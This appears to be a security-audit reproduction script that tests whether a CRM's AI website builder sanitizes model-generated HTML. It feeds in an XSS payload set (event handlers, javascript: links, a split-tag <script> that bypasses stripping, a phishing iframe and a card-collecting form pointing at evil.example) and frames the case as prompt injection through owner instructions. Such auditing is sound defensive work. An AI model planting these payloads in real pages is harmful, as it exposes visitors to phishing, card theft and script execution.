// Portable repro (audit 2026-09-03). Run from anywhere: node nexuscrm/audit/repro/ai_body_xss.mjs
import { fileURLToPath, pathToFileURL } from 'node:url';
const ROOT = fileURLToPath(new URL('../../', import.meta.url));
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { JSDOM, VirtualConsole } = require((ROOT+'node_modules/jsdom'));
const { init, DB } = require((ROOT+'tests/d1mock.js'));
await init(readFileSync((ROOT+'backend/schema.sql'),'utf8'));
const worker = (await import(pathToFileURL(ROOT+'backend/src/index.js').href)).default;
const env = { DB, API_IP_RATE_MAX: 1e9, API_TOKEN_RATE_MAX: 1e9, ENCRYPTION_KEY: 'test-secret' }; const ctx = { waitUntil: (p) => Promise.resolve(p).catch(()=>{}) }; const BASE='http://test.local';
async function call(method, path, body, token){ const h={'Content-Type':'application/json',Origin:'http://app.local'}; if(token) h.Authorization='Bearer '+token; const r=await worker.fetch(new Request(BASE+'/api'+path,{method,headers:h,body:body?JSON.stringify(body):undefined}),env,ctx); const txt=await r.text(); let data=null; try{data=JSON.parse(txt);}catch{} return {status:r.status,data,text:txt}; }
const token = (await call('POST','/auth/register',{name:'T',email:'t@x.com',password:'password123',workspace_name:'W'})).data.token;
await call('PATCH','/ai/settings',{provider:'nvidia', nvidia_key:'nvapi-abcdefghijklmnop1234567890'},token);
// The model (e.g. after prompt injection through OWNER INSTRUCTIONS / plan text) emits body HTML with event handlers, javascript: URLs, iframes, meta refresh, and a <script> split across tags.
const hostile = `<section class="nx-hero"><h1>Hi</h1>
<img src=x onerror="window.__ai_img=1">
<a class="btn btn-primary" href="javascript:window.__ai_js=1">Go</a>
<iframe src="https://evil.example/phish" style="position:fixed;inset:0;width:100%;height:100%;border:0"></iframe>
<meta http-equiv="refresh" content="0;url=https://evil.example">
<svg onload="window.__ai_svg=1"></svg>
<form action="https://evil.example/steal" method="post"><input name="card"></form>
<div style="background:url(javascript:1)"></div>
<scr<script>ipt>window.__ai_split=1</script>
<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">
</section>`;
globalThis.fetch = async () => new Response(JSON.stringify({choices:[{message:{content:hostile}}],usage:{total_tokens:10}}),{status:200,headers:{'Content-Type':'application/json'}});
const site = await call('POST','/sites',{name:'AI Body Test', description:'test', build_with_ai:true, published:true, design_id:'sentinel'},token);
console.log('POST /sites →', site.status, 'id', site.data?.id, 'slug', site.data?.slug);
const pub = await worker.fetch(new Request(BASE+'/s/'+site.data.slug), env, ctx); const html = await pub.text();
console.log('public page bytes', html.length, '| CSP header:', pub.headers.get('content-security-policy') || '(none)');
const checks = {
  'onerror= survives': /onerror=/i.test(html),
  'javascript: href survives': /href="javascript:/i.test(html),
  'evil iframe survives': /<iframe[^>]+evil\.example/i.test(html),
  'meta refresh survives': /<meta http-equiv="refresh"/i.test(html),
  'svg onload survives': /<svg onload=/i.test(html),
  'form action to evil survives': /<form action="https:\/\/evil\.example/i.test(html),
  'split-script re-forms into <script> after strip': /<script>window\.__ai_split=1<\/script>/.test(html),
  'object/embed survive': /<object |<embed /i.test(html),
};
for (const [k,v] of Object.entries(checks)) console.log((v?'  ✗ ':'  ✓ ')+k+' → '+v);
// Execution proof in jsdom
const vc = new VirtualConsole(); vc.on('jsdomError', ()=>{});
const dom = new JSDOM(html, { runScripts:'dangerously', virtualConsole: vc, pretendToBeVisual:true, beforeParse(w){ w.matchMedia=()=>({matches:false,addEventListener(){},addListener(){}}); w.IntersectionObserver=class{observe(){}unobserve(){}disconnect(){}}; w.requestAnimationFrame=(f)=>setTimeout(f,0); w.HTMLCanvasElement.prototype.getContext=()=>null; w.scrollTo=()=>{}; } });
await new Promise(r=>setTimeout(r,400));
const w = dom.window;
console.log('jsdom: split <script> executed:', w.__ai_split===1, '| svg onload executed:', w.__ai_svg===1, '| img onerror wired:', !!w.document.querySelector('img[onerror]'));
// what the sanitizer is supposed to do
const src = readFileSync((ROOT+'backend/src/index.js'),'utf8').split('\n');
console.log('\nsanitizer at L7739-7740:'); console.log(src.slice(7738,7740).join('\n').slice(0,300));
process.exit(0);
